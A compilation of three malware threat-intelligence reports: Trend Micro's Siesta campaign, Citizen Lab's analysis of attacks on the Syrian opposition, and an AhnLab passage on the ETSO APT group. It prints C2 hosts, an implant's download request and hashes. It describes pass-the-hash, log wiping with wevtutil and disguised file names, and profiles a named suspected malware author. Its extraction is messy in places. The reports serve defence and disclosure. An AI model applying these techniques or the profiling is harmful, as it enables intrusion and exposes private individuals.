of personnel within the organization.Instead of using attachments and document exploits, this specific
campaign served their malware through a legitimate-looking file download link.To lure the target into downloading the file, the attacker serves the archive under a URL path named after
the target organization’s name as cited below:

    http://{malicious domain}/{organization name}/{legitimate archive name}.zip

This archive contains an executable (TROJ_SLOTH) disguised as a PDF document.When executed, it
drops and opens a valid PDF file, which was most probably taken from the target organization’s website.Along with this valid PDF file, another malicious component is also dropped and executed in the
background.This backdoor component is named google{BLOCKED}.exe.(Due to the ongoing investigation, we are
unfortunately unable to share hashes and filenames at this time.)This backdoor connects to
http://www.micro{BLOCKED}.com/index.html, which are its command-and-control (C&C) servers.Trend Micro identifies these samples as BKDR_SLOTH.B.At this point, the malware begins waiting for additional commands from the attacker.Based on our research, we found 2 variants of the malware used in this campaign.Although not exactly
alike, the behaviors are nearly identical.One of the similar samples is a file named Questionaire Concerning the Spread of Superbugs February
2014.exe (SHA1: 014542eafb792b98196954373b3fd13e60cb94fe).This sample drops the file
UIODsevr.exe, its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of
communicating to its C&C at skys{BLOCKED}com.These samples are identified by Trend Micro as
BKDR_SLOTH.A.Both variants excessively use Sleep calls, which renders the malware dormant for varying periods of time,
hence the campaign name “Siesta” (which means to take a short nap in Spanish).We were able to identify this new
campaign through inspecting hashes, C&Cs, registrants, commands, and additional information.<figure></figure>

                      Figure 1.Attribution Graph (click the thumbnail for full view)

During the course of our investigation into this new campaign, we investigated the malware dropped.We
quickly noticed the registrant of sky{BLOCKED}.com is also the same registrant as
micro{BLOCKED}.com and ifued{BLOCKED}.net.This individual used the name Li Ning and others with
an email address of xiaomao{BLOCKED}@163.com.This individual also recently registered 79 additional
domains.There are a total of roughly 17,000 domains registered with this same email address.<figure></figure>


               Figure 2.Domains registered under the name Li Ning, based on Whois data
</section>
  <section>
Conclusion

Early detection is crucial in preventing targeted attacks from exfiltrating confidential company data.Organizations and large enterprises need an advanced threat protection platform like Trend Micro™ Deep
Discovery, which can mitigate the risks posed by targeted attacks through its various security technologies
and global threat intelligence.At the heart of our Custom Defense solution is Deep Discovery which
provides real-time local and global intelligence across the attack life cycle.This can help IT administrators
understand the nature of the attack they are dealing with.Trend Micro blocks all related threats, emails and URLs associated with these attacks.As always, we
advise users to exercise caution when opening emails and links.With additional insights and analysis from Kervin Alintanahin, Dove Chiu, and Kyle Wilhoit.</section>
</doc>#footnote number 8 missing.<doc>
<cover>

Research Brief
The Citizen Lab                                                                      
Number 19 – June 2013

<heading>A Call to Harm: New Malware Attacks Target the Syrian Opposition
Authors: John Scott-Railton and Morgan Marquis-Boire</heading>
</cover>

<section>
<heading>SUMMARY OF KEY FINDINGS</heading>
-   Malware masquerading as the circumvention tool Freegate.-   A campaign masquerading as a call to arms by a pro-opposition cleric.</section>

<section>
<heading>INTRODUCTION</heading>
Syria’s opposition has faced persistent targeting by Pro-Government Electronic Actors (PGEAs) throughout the Syrian civil war.A pro-government group calling itself the Syrian Electronic Army has gained visibility in recent months with high profile attacks against news organizations.Meanwhile, Syrian activists continue to be targeted with online attacks apparently for the purposes of accessing their private communications and stealing their secrets.Throughout 2012, attacks against the Syrian opposition were documented in an extensive series of blog posts by Morgan Marquis-Boire and Eva Galperin with the help of the Electronic Frontier Foundation.<fn>1</fn> Many others have also contributed to research on Syrian malware, from Telecomix to a range of security companies.Meanwhile, the Syrian opposition, and several groups working closely with it, such as Cyber Arabs, have been active in attempting to identify potential threats and warn users.Researchers have identified a common theme among the attacks against the Syrian opposition: sophisticated social engineering that is grounded in an awareness of the needs, interests, and weaknesses of the opposition.Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files, or exploit fears of hacking and surveillance with fake security tools.Attacks are often transmitted to potential victims from the accounts of people with whom they are familiar.The two attacks that are described in this blogpost follow this theme.One is a malicious installer of the circumvention tool Freegate.The other is an e-mail attachment calling for jihad against Hezbollah and the Assad regime or promising interesting regional news.</section>

<section>
<heading>ATTACK 1: A HELPING OF MALWARE WITH THAT PROXY?</heading>
In this attack, which we first observed in the second week of June, the potential victim is encouraged to visit a download link containing a malicious installer of Freegate.Freegate is a standalone circumvention-bypassing Virtual Private Network (VPN) client for Windows.Legitimate versions of the Freegate software are available for download on its website.While initially developed for mainland Chinese users, the software is used in a number of other countries.While Freegate was erroneously labelled a Trojan by one anti-virus company nearly a decade ago, in this attack, attackers packaged what appears to be a legitimate version of Freegate with a malicious implant.<fn>2</fn> The targeted group were members of the Syrian opposition in a private social media group.The copy of Freegate launched is listed as “Freegate 7.35 Professional Edition.” The Freegate software begins operating, and quickly prompts the user for an update.<figure></figure>
</section>

<section>
<heading>Infection</heading>
In addition to running a legitimate copy of Freegate 7.35,<fn>7</fn> the malware installs an implant.Videos can be found on YouTube demonstrating its functionality.The tool offers a range of options to the attacker, from keylogging and remote activation of the webcam to file exfiltration.ShadowTech RAT control console:

<table>
File                      Date                      Countries of Submission
svchost.exe               2013-06-15 23:08:19 UTC   Saudi Arabia
VPN-Pro.exe                  2013-06-15 22:45:33 UTC                Turkey, Saudi Arabia, Morocco
</table>

<figure></figure>

Both VPN-Pro.exe and svhost.exe have been submitted to VirusTotal:

Both have relatively low detection rates by anti-virus software.As of June 20, 2013, svchost.exe was only detected by four out of 47 tested anti-virus programs, while VPN-Pro.exe was only detected by five out of 46.The svchost.exe initiates an outbound connection to a command and control (C2) server hosted at thejoe.publicvm.com.This domain resolves to an address inside Syrian IP space: 31.9.48.119.<list>
inetnum:           31.9.0.0 - 31.9.127.255
netname:           SY-ISP-TARASSUL
descr:             Tarassul inetnet Service Provider
country:           SY
</list>

This is not the first time that malicious installer packages have been created for circumvention tools.In 2012, malicious installers for Green Simurgh—a standalone proxy intended for Iranian users but also used by some Syrians—were found in circulation.The creators of Green Simurgh responded by posting a prominent warning on their website highlighting the presence of these malicious installers.Last year, malware which purported to be the Tor Browser Bundle was found in the wild.It was found to be backdoored by Gh0st RAT and exfiltrated data to an IP in China.An attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious as it targets users who likely recognize the importance of privacy and circumvention, and may believe that they have increased their privacy and security by installing the tool.</section>

<section>
<heading>ATTACK 2: A TARGETED CALL TO ARMS</heading>
In this campaign, contact with targets was initiated through phishing e-mails, chat messages and Facebook posts.Although we became aware of this campaign in early June, we have evidence that it may have started as early as January 2013.We believe that this campaign targeted—at least in part—high-profile members of the Syrian opposition.Interestingly, the attack included targeting of at least one non-public address associated with internal opposition communications.This indicates some degree of prior penetration of the opposition — either through computer network intrusion or other intelligence gathering activities.The potential victim in this attack first receives a message from an unknown source, in this case, a Gmail account with a nondescript name.Example e-mail:

<figure></figure>

The e-mail contains text, an image (not shown), and an attachment.The text refers to a video of Sheikh Adnan al-Arour—a Sunni pro-opposition cleric—based in Saudi Arabia, calling for holy war against Assad and Hezbollah.The user is led to believe that opening the zip file, which is descriptively titled as being the Sheikh’s opinion, will provide access to the video.While we have identified multiple different attacks with different zip files, the structure of all of these is consistent with the example described here.Example zip files:
<list>
‫ راب ط – ال ش يخ عدن ان ال عرعور ي ع لن ال جهاد‬.zip
‫ ا صاب ة ال م ب عوث ال دول ي االخ ضر االب راه يمي ب ج لطة دماغ ية‬.zip
‫خاص جدا حول مجزرة ن هر ق وي ق وال م سؤول ال ح ق ي قي ع نها‬.zip
</list>
The zip file extracts to a Windows Shortcut file with the same name and a .lnk extension.Example .lnk file “Sample A”:
<list>
‫ت الف ال عرعور عدن ان ال ش يخ‬   ‫ال سوري ال وط ني ب اإلئ‬.lnk
</list>
Parsing these files reveals a URL embedded in the the file (bolded below).These are visible in the link parsing.Example of YouTube video shown to victim:

<figure></figure>
</section>

<section>
<heading>The Malware</heading>
While the victim sees the decoy YouTube video or news website, a php file (g.php) that contains a hex-encoded malicious binary is fetched.The malware attempts to download a remote file called “123.functions”:
<list>
GET /123.functions HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.5);
.NET4.0C; .NET4.0E; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR
3.0.04506.30)
Host: tn5.linkpc.net:81
</list>
It was not possible to retrieve the remote file at the time of analysis.</section>

<section>
<heading>CONCLUSIONS</heading>
As the conflict in Syria drags on, digital campaigns targeting Syrian opposition have persisted.We have chosen to highlight two attacks that are part of recent efforts by Pro-Government Electronic Actors to compromise opposition communications and steal their secrets.These attacks cater to the opposition’s communication behaviors and tactics.They are indicative of a combination of prior intelligence about the opposition, and ingenuity in social engineering.For example, many in the Syrian opposition are now aware of the electronic threats they face and seek out tools to increase their communications security and privacy.Tools and information about security and communications are in constant circulation.Some of this material addresses well-defined vulnerabilities.We have observed a greater degree of care among many in the opposition when facing certain situations that were common attack modalities in 2012.As awareness grows and behavior evolves, we suspect that some of the attacks that we regularly observed in 2012 are much less successful today.Some of the information and practices that are shared between users, however, are much less appropriate, even inadvertently dangerous.For example, many legitimate tools are shared via third party file sharing sites or over social media.This situation presents a rich variety of targets for attackers in which to seed malicious binaries and links masquerading as familiar or desirable tools.We infer that from the point of view of these attackers, not all attacks need to have sophisticated malware in order to be successful enough to be worth doing.Yet, perhaps in response to the growing awareness of previous and often widely targeted attacks against the Syrian opposition, attackers continue to innovate and experiment with new techniques that blend social engineering with new attack styles.The experiments are sometimes clearly successful.For example, in the case of Attack 2, the Windows shortcut files were not conclusively identified as malicious by even savvy opposition members for an extended period of time.We hope that this post will increase awareness of the two attacks among potential targets.In the meantime, users who have executed either the fake Freegate file or clicked on one of the Windows shortcut files should consider their computers and accounts compromised.</section>

<section>
<heading>APPENDIX: RECOMMENDATIONS FOR FREEGATE AND FREEGATE USERS</heading>
The Freegate website is blocked in China (its primary target market), as is the case with other similar circumvention tools.To get around blocking, tools are often distributed between individuals, or through untrusted downloads from third party sites.This is an unfortunate vector for attackers to distribute malicious installers and bundles that also contain functional versions of the program.As demonstrated by our work on the Freegate malware, as well as the Green Simurgh case, these vulnerabilities are exploited with serious consequences for high-risk users.We understand the resource constraints that developers of free security and circumvention software often face.As such, we propose two simple steps that Freegate could take to help mitigate the current and similar future threats.1) Freegate should take steps to make their users aware of the threat.We provided Freegate developers with details of the attack, copies of the malicious binary, and other details prior to publication.We would like to point them towards the example established by Green Simurgh, who promptly posted a multilingual warning to their website when a malicious repackaging of their tool was found to be targeting Syrian users.We have offered to help them translate any warning materials into Arabic.2) Freegate should implement by-default HTTPS on their website.Currently, visitors to the Freegate website follow non-HTTPS links to an unencrypted download.We believe that this presents a clear risk for man-in-the-middle attacks.Most developers of similar anti-censorship, circumvention, and security tools have implemented this security measure.We encourage Freegate to follow suit.</section>

<noncontent>
<heading>ACKNOWLEDGEMENTS</heading>
Special thanks to several anonymous Syrians who brought these malware samples to our attention.Additional thanks to Bill Marczak, Byron Sonne, Adam Senft, and Ron Deibert.</noncontent>


<footnote>
Footnotes
1  State-Sponsored Malware, “Electronic Frontier Foundation,” https://www.eff.org/issues/state-sponsored-malware.2  We notified Freegate on June 17, 2013.3  MD5 b3e1c2e40be54fbc0f7921ea8ce807e2 ; SHA1 3f6436420e84ac96d9a3c93045c07cdadda8ec81 ; SHA256 3712907740045871eef218fea7292c9c017e64cbb56b193b93f1a1b80afe599d
4  MD5 8eda7dfa4ec4ac975bb12d2a3186bbeb ; SHA1 b5c49bbbf7499a30110adc94480b3edbc8d6e92b ; SHA256 829e137279f691e493c211108b62c8e15b079bd619ba19ad388450878e0585d0
5  It failed to execute with .NET 4.0 on Windows XP.6  The implant is installed regardless of whether or not the victim completes the FreeGate installation process.7  The file fg735p.exe matches the hash of a legitimate FreeGate installer.</footnote>

</doc>Characteristics of the ETSO APT Attack ............................................................................................ 8

           1.1.Penetrating the internal network using an external update server............................................... 8

           1.2.Using Pass the Pass, Pass the Hash technique to move within the network .............................. 9

           1.3.Attack Continues Exploiting Certificates ...................................................................................... 9

           1.4.Using Anti-Forensic Tactics .......................................................................................................... 9

           1.5.Attack Continues Even When Discovered ................................................................................. 10

           1.6.Attack Techniques Improve with the Passage of Time ............................................................... 10

     2.ETSO APT Attack Techniques by Level ............................................................................................ 11

           2.1.Initial Compromise ...................................................................................................................... 11

           2.2.Establishing a Foothold .............................................................................................................. 12

           2.3 Escalation of Privileges ............................................................................................................... 13

           2.4.Lateral Movement ...................................................................................................................... 14

           2.5 Maintain Network Presence ........................................................................................................ 14

           2.6.Compromised Data .................................................................................................................... 15

Tracing the ETSO Malicious Code .................................................................................. 16
     1.ETSO Master ....................................................................................................................................... 16

     2.Network Traffic Analysis .................................................................................................................... 17

           2.1.Characteristic of the Traffic ........................................................................................................ 17

           2.2.Traffic Encoding.......................................................................................................................... 17

     3.Profile of the ETSO Creation Tool ..................................................................................................... 18

Conclusions ..................................................................................................................... 23
</toc>

<section>
<heading>Introduction</heading>

The ETSO APT Attack Analysis is based on analysis conducted by A-FIRST, the AhnLab digital forensic team.This report provides a detailed nature of Advanced Persistent Threats which were led by “ETSO Hacking Group” (referred to as ETSO, ETSO Attack or ETSO Hacking Group hereinafter) since 2010.Based on incidents at 12 companies, this report shows how the ETSO APT attacks progressed, which methods were used at each stage of the attacks and the results of the ETSO malware analysis.AhnLab named the malicious code, which has targeted a specific industry, as “ETSO” since March 3, 2011.The statistics in this report are extracted from AhnLab Smart Defense, a cloud-based malware analysis system, known as ASD.APT attacks by ETSO Attack Group began with the distribution of malware on July 18, 2011.Until now, ETSO Attack Group has fiercely attacked multiple companies for various purposes such as stealing business know-how of online game companies as well as for certificates and cyber money.ETSO Attack Group commits attacks entirely for reasons of financial profit.In the APT attacks against the companies in Korea, the ETSO Attack Group used encrypted communication between the master which generated the malware, monitored the system and managed the C2 agent, and the agent which accessed the C2 server.The ETSO Attack Group penetrated the targeted network via the C2 agent and remained dormant for a long period of time without any abnormal behavior that would trigger a network error or website compromise, thus making it difficult to detect the attacks.<figure><caption>Figure 1.Malware Toolkit of ETSO Group</caption></figure>


AhnLab analyzed two malware toolkits of ETSO and confirmed they were the same or very similar to the malware “Winnti,” named by Kaspersky Labs and the malware toolkit “TrendMicro Plug” named by TrendMicro.Considering that the ETSO Attack Group used the email accounts of the security division of the target company to distribute more malicious emails through the employee accounts and reacted in real-time to security responses and the business schedule of the target, it is assumed that there were Korean natives or multilingual persons among the attack group.As the ETSO APT attacks have progressed, the malicious codes used in the attacks have consistently improved and become more sophisticated since 2011.The attacker has been very unpredictable or rather, creative, and has not left any traces.This has made digital forensics as the only method applicable for extracting the appropriate data in unallocated areas in order to analyze and respond to the ETSO APT attacks.<figure><caption>Figure 2.ETSO Advanced Attack Timeline</caption></figure>

</section>

<section>
<heading>Statistics of APTs by ETSO</heading>

The C&Cs (Command & Control) attacked by ETSO were mainly located in South Korea, Hong Kong, China and the US, reaching a peak of 64.30% of all attack locations.The C&C servers which were used to attack Korean game companies came primarily through IPs from South Korea and Taiwan.Normally, there are specific game servers for specific countries.When the entire IPs were blocked from a certain country, the attacker would use another country’s IPs and continue on with the attack.<figure><caption>Figure 3.Locations of C&C servers of the ETSO Attack Group</caption>

South Korea was the primary victim of the ETSO APT attacks with an infection rate of 85.6 percent.The
nature of the attack was geared towards the internet game industry, of which South Korea has the most
clients.<figure></figure>


                     <caption>Figure 4.Ratio of ETSO impacted IPs by country</caption>
</table>


Based on the analysis of malicious codes creator known as the master and the ETSO APT malicious codes, and using the first distributer of the malicious files IPs as the standard, it has been incontrovertibly determined that the majority of the IPs came from China.<figure>               <caption>Figure 5.IPs by Countries that Generated ETSO Malicious Codes</caption>
</table>

</section>

<section>
<heading>ETSO APT Activities</heading>

<heading>1.Characteristics of the ETSO APT Attack</heading>

<heading>1.1.Penetrating the internal network using an external update server</heading>

In order to penetrate a company’s internal network, the ETSO Attack Group used an external update server.First, the group seized the update server of application program, which is most frequently used since these types of programs are not highly managed and easy to attack.The attacker then changed the update setting file to be downloaded on to the user’s system.Finally, the module of the application program in the user’s system reads the modified setting file and downloads to execute the malicious codes from the server which was built by the attacker.Since this type of attack is hard to detect, the attack was much more likely to succeed bringing about a catastrophic result with a single attack since many users use the application update server.Moreover, the attacker who seizes the update server targets a specific IP bandwidth of the company rather than randomly distributing malicious codes.The reason why the attacker opts for the former is because random distribution that scatters malicious codes are more likely to be discovered and may be more easily detected by security products.<figure><caption>Figure 6.Malicious Codes Distributing Process Using the Update Server</caption></figure>


</section>

<section>               
<heading>1.2.Using Pass the Pass, Pass the Hash technique to move within the network</heading>

Once the malicious code penetrates the internal network, it will acquire various kinds of information using the
user account.The attacker obtains the ID, password, NTLM hash value from the registry and memory area
and moves on laterally to another system.The attack process is as follows:

Using the user account information, the attacker creates an agreement with the network sharing system of
the target system and the malicious code is then copied.The work schedule is registered and the copied
malicious code is activated.This type of attack is called the Pass the Pass, Pass the Hash attack method.The ETSO Attack Group used tools such as gsecdump, which was already disclosed before, WCE (Windows
Credentials Editor), and mimikatz; or, alternatively, they may have used DLL (wceaux.dll, sekurlsa.dll), which
were inserted in the malicious code to attack the system.Such attacks are possible because most systems within the company often use the same local administrator
ID and Password for the sake of convenience.Or within the Active Directory, it tends to use the same domain
administrator account to access multiple systems, leaving the domain admin ID, password and hash value in
the memory.<figure></figure>


                                 <caption>Figure 7.Moving within the Internal Network</caption>
</section>

<section>
<heading>1.3.Attack Continues Exploiting Certificates</heading>

The ETSO Attack Group signed the malicious codes using the certificate they obtained.The reason for stealing certificates lies in the fact that files that are not signed by a legitimate certificate will be detected by security products.Therefore, besides attacking the updates for cyber money and personal information, the stealth quality of certificates was also one of the attack goals of the ETSO Group.This indicates the characteristic of the attack, which shows that the multiple attacks were made by a single group.</section>


<section>
<heading>1.4.Using Anti-Forensic Tactics</heading>

In order to hide oneself, the attacker used more than one anti-forensic tactic.The ETSO Attack Group copied the batch file when copying the malicious codes via network sharing, and it was this batch file that proceeded with anti-forensic techniques.The batch file used the malicious code and cl option from the work schedule file (.job), and the wevtutil option to delete the event logs (Security, System and Application).These types of anti-forensic tactics make forensic analysis difficult, hindering the effort to find the entrance of attack through back-tracing.<figure><caption>Figure 8.Batch File Proceeding with Anti-Forensic Tactic</caption></figure>

                                          
</section>

<section>
<heading>1.5.Attack Continues Even When Discovered</heading>

The ETSO Attack Group attacks for monetary reasons.For example, the Group attacks cyber money updates and personal information.Even if the attack is detected by security products, the attack continues on with the purpose of interfering with the service and ultimately destroying the system.Once the DB is accessed by the attack, the malicious codes continue to be distributed, creating an overflow to keep a connection with the C&C server, even when the system admin or analyzer finds the malicious codes and deletes them.Thus, it is very difficult to block the attack if all of the attacks are not analyzed well and dealt with all at once.</section>

<section>
<heading>1.6.Attack Techniques Improve with the Passage of Time</heading>

Table 4 shows the footprints of the attacker and a summary of the response.The ETSO Attack Group is seen here to have improved its attack technique in various ways as time passes.ETSO APT Technique Changes over Time</caption>
</table>

                                               
In early days, ETOS hacking group used random file names, algorithms, and path for installing malicious files.As time passed, however, they changed the naming scheme to sound similar with normal file names or system rules making malicious codes detection difficult.<table>
                         Characteristic                                                          Example file names

  APT email’s attachment names
                                                                       120201.xls[multiple spaces].exe, ad-plan.pptx[multiple spaces ].exe,
  - By adding a number of empty spaces between the
                                                                       Buy.hwp [multiple spaces].exe and etc.extensions on the doc file, it makes it difficult to know that the
  file is exe.Uses a file name that can be easily confused with the product        AcroRd32Update.exe,      AsusSetup.exe,      AtSuper(v.0.12).exe,
  update file name.ChromeSetup.exe, Gom_player_update.exe, GOMPLAYERSETUP.EXE

  - Uses a file name related to Adobe, Nvidia and Symantec file        Patch Update.exe, setup.exe, setup_x64.exe, setup_x86.exe, Update.cpl,
  names or uses install, update, setup, patch names.update.dat, update.exe, hwpupdate.exe and etc.Uses file names that are loaded by OS priority.tsvipsrv.dll, winmm.dll, msvidc32.dll, wiarpc.dll, TSMSISrv.dll 등

                                                                       6to4adv.dll, pciexii.dll, pciexij.dll, TVT.DLL, MWSCDS.dll, qwert8320.bat,
  File names that only ETSO uses.default_.pif, wlrpc.dll, ntfs[3 random texcts].mof, ssk.log and etc.File names that are specific for attacking company.dc1.exe, Dc2.dat, DK_GMR.exe, dk_winmm.dll, gameon.exe and etc.SUCHOST.EXE ,sv1.exe, svc.exe, TSMSISrv.dll, TSVIPSrv.dll, usp.fx,
  Uses name that appears similar with a normal file.usp10.dll, PROCEXP113.sys and etc.File names related to the DB.opends60.dll, sql120.dll, sqlos.dll and etc.<caption>Table 5.Characteristics of ETSO Malicious Files</caption>
</table>

</section>

<section>
<heading>2.ETSO APT Attack Techniques by Level</heading>

<heading>2.1.Initial Compromise</heading>

This is the first stage where the attacker first tries to enter the company’s internal network.Many times, the ETSO Attack Group targets the update server, which is the most frequently used application program in the company.The attacker will seize the server and change the settings so that the malicious codes are downloaded on a specific target system.Another method is to disguise itself as an internal mail, enticing the user to open and execute the file.In this case, the attacker disguises oneself as an employee from a security division, sending out email with a malicious hyper link.It has been found that the attack email is written in Korean, indicating that there are native Korean speakers in the ETSO Attack Group.<figure><caption>Figure 9.APT Mail Using the Documents Acquired from a Game Company</caption></figure>

</section>

<section>
<heading>2.2.Establishing a Foothold</heading>

The attacker that succeeded in initial attack creates a backdoor to the system and prepares a path for continuous attack.In this case, the first attack is mainly made on the employee’s network regularly used for general work.In the case of the ETSO Attack Group, the back door generation program made it possible for many techniques to be executed with a variety of “back doors” to communicate with the C&C.The uploaded back door was disguised as a generally used program such as a driver, Office or Chrome install file.Such disguised features induce users to install the file.<figure><caption>Figure 10.File Menu of ETSO Backdoor Generating Program (Top: Infected PC file.Bottom: Master file information)</caption></figure>

</section>

<section>
<heading>2.3 Escalation of Privileges</heading>

The attacker who successfully installed the back door on the initial attack, then moved on to the target system.In order to progress, the attacker needed to access an account from a higher authority such as information from an administrator, including ID, password and NTLM Hash information, all available in the system registry and memory.In the case of the ETSO Group, they would use existing tools such as gsecdump, WCE(Windows Credential Editor), mimikatz or insert the DLL (wceaux.dll, sekuralsa.dll) in the malicious code, dropping and calling the information.In addition, the attacker may use its key logging function from the backdoor to steal the ID/Password.For the sake of convenience, the same IDs and Passwords are mainly used for all of the local system administrators.Also, a domain administrator account is used to access more than one system in the active directory setting.In this case, the attacker can easily acquire the administrator’s ID/Password as well as the hash value.<figure>                 <caption>Figure 11.Acquiring Domain Administrator’s NTLM Hash through WCE</caption></figure>

</section>

<section>
<heading>2.4.Lateral Movement</heading>

The attacker who obtained the account information of privilege authority then created a back door to the system.In this case, if the acquired account was the domain administrator’s, then the attacker could install back doors on all of the corresponding parts of the domain as well as the domain and systems in trust relations.The install process is as follows:

The attacker will use the acquired ID/Password or NTLM Hash value to create an agreement with the system network to move to, and copy, the back door.The copied backdoor is then executed using the work scheduler, and it is operated using the system authority.The executed back door then broadcasts connection status with the C&C server using the proxy feature, and the attacker approaches the corresponding system based on the broadcast information.The attacker repeats the process until the target system is found, such as a DB.In most cases, the attacker will search for an administrator’s system inside the network, approach the gateway server and finally enter the server network.From then on, the attacker uses the same method and installs many back doors in the server network.</section>

<section>
<heading>2.5 Maintain Network Presence</heading>

The attacker uses various Reloading Point techniques in order to maintain the connection between the installed back door and the C&C server.First, a Bootkit technique will be used to load the backdoor after transforming the MBR.The characteristic of the bootkit is that the corresponding bootkit is encoded with XOR on the loading data inside the trash and it is saved.Another method is to use files such as wiarpc.dll, tsvipsrc.dll which are loaded automatically during booting.The malicious file such as the DDL is saved under folder 32 and is used during the back door reloading.Registering the back door as a general service is also one way it may be used.The attacker uses various kinds of anti-forensic techniques in order to avoid being disconnected with the C&C server once the back door is discovered.The backdoor install file and batch file are copied by network sharing, and the batch file is executed with the work scheduler.The batch file executes the back door install file and deletes the install file as well as the work schedule file (.job), and the cl of the wevtutil command is used to delete the event logs (security, system and application).Additionally, the registry key values are deleted in order to erase traces of the back door execution into the service.With these anti-forensic techniques, the attacker reduces the backdoor detection rate, avoiding the chances of being caught by back tracing.In addition, a method of installing backdoor only in the memory area was applied, since this can avoid the threat detection of security products.After installation, the backdoor erases all of the files and only exists in the memory while waiting for the system to turn off.When the system is turned off, the files needed for back door reloading are generated and they are loaded during system booting.Then, the loaded back door erases all of the related files and stays only in the memory.Even though administrators and analysts detect back doors and delete them, the attacker will install even more back doors on the system to maintain its connection with the C&C server.<figure><caption>Figure 12 Securing Connection with the Network Using the MBT Bootkit</caption></figure>

</section>

<section>
<heading>2.6.Compromised Data</heading>

The attacker who approaches the DB server will proceed with various kinds of tasks depending on the attack purpose such as attacking the cyber money or stealing personal information.In the case of a cyber-money update, a query request is made on the DB using the features embedded on the back door and by SQLCMD.EXE.Or, the existing Stored Procedure is changed to update.When the Stored procedure registered in the mail table is changed and the mail is received, the Stored Procedure is operated to update the cyber money of a specific character.Also, the DDL which is used in the MS SQL DB which transforms the opends60.dll (SQL Open Data Services DLL), can be used to update the cyber money.In case of information leakage, a DB for a customer information dump file is generated, compressed as BZIP (bz2) and exported out using FTP.<figure>            <caption>Figure 13.Cyber Money Update Using the Transformation of Stored Procedure</caption></figure>

</section>

<section>
<heading>Tracing the ETSO Malicious Code</heading>

<heading>1.ETSO Master</heading>

<figure><caption>Figure 14.ETSO Malicious Code Agent Master</caption></figure>

<figure> <caption>Figure 15.ETSO Agent Manager Menu</caption></figure>

                    
On the top portion of the master, there are two main menus: agent list and agent master.The center area shows the directory of the agent lists which are connected, and the bottom portion shows variety of options related to the master.</section>

<section>
<heading>2.Network Traffic Analysis</heading>

<heading>2.1.Characteristic of the Traffic</heading>

In the initial access, a request for connection is made from an infected remote PC to the master.If the Three-Way Handshake is made between the two, the PC and master will be connected and the information of infected PC will be delivered to the master.<figure><caption>Figure 16.Connected Traffic between Master and Agent</caption></figure>

Then, after every 60 seconds, the Keep-Alive traffic will be created to check the connection between the master and the infected PC.<figure><caption>Figure 17.Keep-Alive Traffic between the Master and the Agent</caption></figure>
                        
</section> 

<section>
<heading>2.2.Traffic Encoding</heading>

In the same OS environment, the same IP and Port were used during the test.It has been found that the traffic is different in its delivery over the same command.After repeated tests, a pattern was found in the traffic between the infected PC and the master.Thus, it is surmised that it was not completely encrypted but was encoded by a certain level.Including the initial connection, the traffic encoding was also applied in the Keep-Alive traffic and in the all command transferred traffic.The Key logging and CMD command results were also not delivered in plain text but in encryption.<figure><caption>Figure 18.Encoded Traffic (When a service administration command is delivered in the same environment, different traffic patterns are found.)</caption></figure>

Currently, the communication between the ETSO malicious code master and the agent is being encrypted.It seems impossible to create a PCRE and REGEX pattern which can be blocked by IDPS and other network security system.Regarding the newest version of ETSO, it is assumed that there must be a telecommunicating module hiding within the network traffic.</section>

<section>
<heading>3.Profile of the ETSO Creation Tool</heading>

The question is thus raised regarding who actually made the ETSO Attack tool in the first place.An investigation was conducted to find the ESTO APT creator as the ETSO master’s traces were traced back in the analysis.In the ETSO master, you can see the http access on the lower menu of the malware toolkit; the Baidu URL values are seen.Baidu is the largest portal site in China.In the middle, you can see the string “DZKSJDADBDCDH-DOCADOCADOCBDDZJS”.The string appears when the IP is entered and information is changed, setting the initial value to be ”127.0.0.1”.At this time, the value DZKSJDADBDCDHDOCADOCADOCBDDZJS is set.<figure> <caption>Figure19.Distinctive String in the ETSO Malware Toolkit</caption></figure>


Through a Google search of the ‘DZKSJDADBDCDHDOCADOCADOCBDDZJS’ string on the malware toolkit, a link of ‘http://tieba.baidu.com/p/1103191865’ was found.There were reply messages titled TEST and all of the messages were submitted by a person with the ID “whg0001”.This value matches the one on the ETSO malware toolkit.It is assumed that the attacker designated a specific blog address when the ETSO APT malicious code agent was activated in order to immediately determine whether the attack was successful or not.The attacker can know the victim’s IP address after decrypting the encryption.<figure><caption>Figure 20.The Website ‘http://tieba.baidu.com/p/1103191865’</caption></figure>

It is assumed that the according blog content is related to the APT tool creation.Thus, a further investigation was made on the person with the ID of whg0001.When the link of whg0001 is clicked, brief information on the person with the ID whg0001 appears.He is a male who was born and still lives in Szechuan, Chengdu.<figure><caption>Figure 21.Information on User ID whg0001</caption>
</table
                                  

On his blog, whg001 wrote on Aug. 17, 2011, “I visited my home school a couple days ago.Looking back, those were the happiest days.” It has also been found that the comment came from the free-board of Jipu High School.Thus, it has been determined that whg001 attended Jipu High School.<figure><caption>Figure 22.Content on whg0001’s Blog</caption></figure>

According to the writings on the board and the content of whg0001’s blog, the name of the writer is Jiao Xang Bo, who entered high school in 1994 in homeroom number 4.Also, he was looking for a classmate by leaving a message with his QQ ID.whg0001’s QQ ID is found to be (312016).<figure><caption>Figure 23. whg0001’s Comments and QQ ID</caption></figure> 


After investigating the personal information of whg0001, further investigation was made of his online activities.As a result, it has been found that he left comments on the attacker’s freeboard regarding the design of Trojan horse (Refer to Figure 27).<figure><caption>Figure 24.Comments whg0001 Left on the Attacker’s Freeboard.</caption></figure>


Unfortunately, the attacker freeboard does not exist anymore.[Figure 24] translates as follows:

         1.I have realized all of the packets’ MIMA (password/man in the middle attack) different when designing the Trojan horse.2.To go around the vaccine detection, a transformation and other technologies were used to on the Trojan horse.To find the document made by whg0001, the ID was used to search on Baidu.As a result, a document titled “VTCP Introduction and Entry(V11.X)” was discovered.To take a closer look at the document, a link (‘http://wenku.baidu.com/view/2005a703-bb68a98270fefa06?fr=prin’) was accessed (as of August, www.cnasm.com, the address mentioned within the document, was no longer accessible).<figure><caption>Figure 25. whg001’s Document Found in the Search</caption></figure>

Using the QQ ID (312016) above, the result of the QQ main page was as follows:


<figure> <caption>Figure 26. whg0001 QQ Page</caption></figure>


In [Figure 26], the Chinese characters wu hua guo appear.The first letter of each synonym has been used as an ID.Profile of Possible ETSO Creator Jiao Xang Bo</caption>
</table>
                       
</section>


<section>
<heading>Conclusions</heading>
